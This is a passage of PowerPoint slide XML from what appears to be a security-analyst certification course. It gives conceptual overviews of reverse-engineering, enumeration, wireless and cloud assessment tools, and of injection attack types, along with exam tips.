              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst relies on these tools to understand how malware operates, locate the code responsible for a payload, and derive detection signatures.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for recognition of disassemblers/decompilers (Binary Ninja, IDA Pro, Ghidra) and control-flow graphs as tools that provide a visual representation of a binary's structure during static analysis.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375</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Disassembly, II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Visual representation of code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Binary ninja demo</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376</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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ENUMERATION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Enumeration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Enumeration is the discovery phase that maps out live hosts, open ports, running services, and their versions to build an inventory of a target environment's attack surface.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Active scanners send crafted probes and read the responses: Nmap (the network mapper) is a widely used cross-platform tool for host discovery, port scanning, and service and OS fingerprinting, while hping is a supercharged ping utility that crafts custom TCP, UDP, and ICMP packets to analyze traffic and test firewall behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Passive scanners instead observe existing traffic without generating probes, and a tool like Responder can listen on the network and answer name-resolution requests to capture credentials, though it also functions as an on-path attack technique.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst uses enumeration to understand what is exposed, validate asset inventories, and identify unexpected or unauthorized services before an attacker does.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions matching enumeration tools to their function (Nmap for network mapping/port scanning, hping for custom packet crafting, Responder for name-resolution poisoning/capture) and distinguishing active from passive scanning.</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377</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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ENUMERATION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Enumeration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Active scanners</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Nmap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Very popular tool available for most operating systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Network mapper</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  hping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Supercharged ping utility</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Craft custom packets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Analyze TCP, UDP, ICMP traffic</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378</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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ENUMERATION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Enumeration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Passive scanners</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Responder</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Remote access attack tool that poisons name services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379</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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WIRELESS ASSESSMENT TOOLS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Wireless Assessment Tools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Wireless assessment tools evaluate the security of Wi-Fi networks by capturing traffic, testing authentication, and attempting to recover keys.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Aircrack-ng is an open-source suite for auditing WLAN security that captures 802.11 frames and cracks WEP and WPA/WPA2 pre-shared keys, Reaver targets and exploits weaknesses in Wi-Fi Protected Setup (WPS) to recover the PIN and passphrase, and oclHashcat (the GPU-accelerated form of Hashcat) cracks captured password hashes by harnessing combined GPU and CPU processing power.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Together these tools let an assessor demonstrate whether wireless encryption and configuration choices actually resist offline and online attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst uses them during authorized assessments to prove weak wireless controls, justify moving to WPA3, and disabling insecure features like WPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Be ready to match wireless tools to their role: Aircrack-ng for WLAN key cracking, Reaver for WPS exploitation, and oclHashcat/Hashcat for GPU-accelerated password/hash cracking.</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380</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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WIRELESS ASSESSMENT TOOLS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Wireless Assessment Tools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Aircrack-ng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Open-source wireless security suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Useful to audit WLAN security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reaver</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Utility that exploits WPS weaknesses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381</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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WIRELESS ASSESSMENT TOOLS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Wireless Assessment Tools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oclHashcat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Password cracker that uses GPU and CPU power</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382</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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CLOUD ASSESSMENT TOOLS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Cloud Infrastructure Assessment Tools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Cloud infrastructure assessment tools audit cloud accounts for misconfigurations, weak identity and access controls, and deviations from security best practices across managed services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scout Suite is an open-source, Python-based multi-cloud auditing tool that supports AWS, Microsoft Azure, Google Cloud, Alibaba Cloud, and Oracle Cloud Infrastructure (OCI), while Prowler is a similar tool focused mainly on AWS and aligned to Center for Internet Security (CIS) benchmarks, and Pacu is an AWS exploitation framework used to actively test and pivot through a compromised cloud environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The auditing tools produce configuration findings (such as public storage buckets or overly permissive IAM policies), whereas Pacu demonstrates how those weaknesses could be exploited.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst uses these tools to validate cloud posture, enforce CIS baselines, and understand how a misconfiguration could lead to a real breach.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions distinguishing cloud auditing tools (Scout Suite for multi-cloud, Prowler for AWS/CIS benchmarks) from cloud exploitation frameworks (Pacu for AWS).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383</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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CLOUD ASSESSMENT TOOLS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Cloud Infrastructure Assessment Tools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Scout Suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Open-source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Uses Python</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Supports AWS, MS Azure, Google Cloud, Alibaba, Oracle Cloud Infrastructure (OCI)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Auditing tool for managed services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384</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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CLOUD ASSESSMENT TOOLS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Cloud Infrastructure Assessment Tools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Prowler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Open-source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Similar to Scout Suite, but mainly for AWS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Based on Center for Internet Security (CIS) best practices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385</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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CLOUD ASSESSMENT TOOLS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Cloud Infrastructure Assessment Tools (3)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Pacu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  AWS exploitation framework</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386</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types – Injection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Injection attacks occur when an attacker supplies specially crafted input that causes software to perform actions the designer never intended, typically because the input is not properly validated or sanitized before being processed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Remote code execution (RCE) is a severe outcome in which the attacker's input tricks the target into running unauthorized commands or functions, potentially giving full control of the system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  XML attacks abuse the Extensible Markup Language used to exchange data between network nodes, either by embedding malicious data (such as XXE external entity references) or by sending malformed input that makes the XML parser hang or crash, while SQL injection targets the Structured Query Language behind relational databases to read, modify, or destroy data through manipulated queries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst prioritizes these because injection consistently ranks among the most common and damaging application weaknesses, and detecting the attack patterns in logs is a core SOC monitoring task.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenarios where you identify the injection subtype (SQL injection, XML/XXE, or command injection leading to RCE) from a payload or symptom, and recognize input validation as the primary defense.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387</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types – Injection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Attacker sends input so software does something unintended by designer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Remote code execution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Tells target system to run some unauthorized function</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Very dangerous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388</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types – Injection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Extensible markup language (XML) attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Exchange data among different nodes on a network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Send embedded bad data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Send invalid data that causes XML parser to hang or crash</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389</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types – Injection (3)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Structured query language (SQL) attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Most common language for relational databases</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Very flexible language</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Hard to secure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Often used along with remote code execution</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390</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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INJECTION AND OVERFLOW ATTACKS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Attack Types – Injection (4)</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Cross-site scripting (XSS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Leverage trust between a client and a server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Persistent attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Attacker stores malicious code on server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Non-persistent attack (reflected)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Vulnerability on server that attacker takes advantage of</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Document Object Model (DOM) attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
